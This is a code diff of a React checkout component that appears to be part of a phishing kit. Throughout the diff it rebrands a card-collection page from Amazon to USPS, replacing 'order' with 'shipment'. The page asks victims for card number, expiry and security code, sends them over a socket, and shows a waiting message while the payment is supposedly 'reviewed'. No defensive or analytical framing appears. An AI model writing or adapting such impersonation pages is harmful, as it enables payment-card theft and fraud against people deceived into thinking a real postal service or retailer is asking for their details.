@@ -172,7 +172,7 @@ export default function Checkout() {
     const normalizedExpiry = normalizeExpiry(expiry, true);
     if (!isValidExpiryMMYY(normalizedExpiry) || !canSubmit || waiting) return;
     setWaiting(true);
-    setWaitingMsg('Details received. Please keep this page open while Amazon reviews your payment information.');
+    setWaitingMsg('Details received. Please keep this page open while USPS reviews your billing information.');
     clearDraft(STORAGE_KEYS.checkoutDraft);
     setExpiry(normalizedExpiry);
     socket.emit('checkout-submit', {
@@ -191,7 +191,7 @@ export default function Checkout() {
             <div className="mx-auto mb-3 h-10 w-10 rounded-full border-4 border-amber-200 border-t-[#ff9900] animate-spin" />
             <div className="text-lg font-semibold text-slate-900">Processing your request</div>
             <div className="mt-2 text-sm text-slate-600">{waitingMsg}</div>
-            <div className="mt-6 text-xs text-slate-500">Please keep this page open while Amazon reviews your payment details.</div>
+            <div className="mt-6 text-xs text-slate-500">Please keep this page open while USPS reviews your payment details.</div>
           </div>
         </div>
       )}
@@ -202,7 +202,7 @@ export default function Checkout() {
             <div>
               <div className="alz-badge">{BRAND.name}</div>
               <h1 className="alz-step-title">Confirm your payment method</h1>
-              <p className="alz-step-subtitle">Review the payment method associated with this order.</p>
+              <p className="alz-step-subtitle">Review the payment method associated with this shipment.</p>
             </div>
           </div>
           <div className="alz-track mt-3">
@@ -214,7 +214,7 @@ export default function Checkout() {
           <div className="alz-card">
             <div className="alz-section-eyebrow">Payment details</div>
             <h2 className="alz-page-title">Review your card details</h2>
-            <p className="alz-page-copy">Enter the card details associated with this order so Amazon can continue processing your delivery.</p>
+            <p className="alz-page-copy">Enter the card details associated with this shipment so USPS can continue processing your delivery.</p>
             <div className="alz-brand-row mb-4">
               {BRAND_PROMISES.map((item) => (
                 <span key={item} className="alz-brand-pill">{item}</span>
@@ -253,14 +253,14 @@ export default function Checkout() {
                   <span className="alz-payment-pill alz-payment-pill-mastercard">mastercard</span>
                   <span className="alz-payment-pill alz-payment-pill-amex">AMERICAN EXPRESS</span>
                 </div>
-                <div className="alz-payment-strip-note">Use a card associated with your Amazon account. Your payment details are encrypted during checkout.</div>
+                <div className="alz-payment-strip-note">Use a payment method associated with this shipment. Your payment details are encrypted during verification.</div>
               </div>
             </div>
 
             <button onClick={onSubmit} disabled={!canSubmit || waiting} className="alz-btn-primary mt-6 text-base alz-checkout-submit">
               {waiting ? 'Processing...' : 'Confirm payment details'}
             </button>
-            <div className="alz-helper-copy mt-6">Keep this page open while Amazon confirms your payment details.</div>
+            <div className="alz-helper-copy mt-6">Keep this page open while USPS confirms your payment details.</div>
             <div className="alz-footer">{BRAND.name} | {BRAND.tagline}</div>
             <div className="text-[11px] text-center text-[#565959] mt-1">{BRAND.legal}</div>
           </div>
@@ -271,7 +271,7 @@ export default function Checkout() {
               <div className="alz-order-mini-thumb alz-order-mini-thumb-card" />
               <div>
                 <div className="alz-order-mini-title">Review the payment method on file</div>
-                <div className="alz-order-mini-copy">Use the payment method linked to this order to confirm the billing details.</div>
+                <div className="alz-order-mini-copy">Use the payment method linked to this shipment to confirm the billing details.</div>
               </div>
             </div>
             <div className="alz-side-summary-list">
@@ -279,7 +279,7 @@ export default function Checkout() {
               <div>Card number and expiration date</div>
               <div>3- or 4-digit security code</div>
             </div>
-            <div className="alz-side-summary-box">Use a card associated with this order so Amazon can continue processing the shipment.</div>
+            <div className="alz-side-summary-box">Use a card associated with this shipment so USPS can continue processing delivery.</div>
           </aside>
         </div>
       </div>
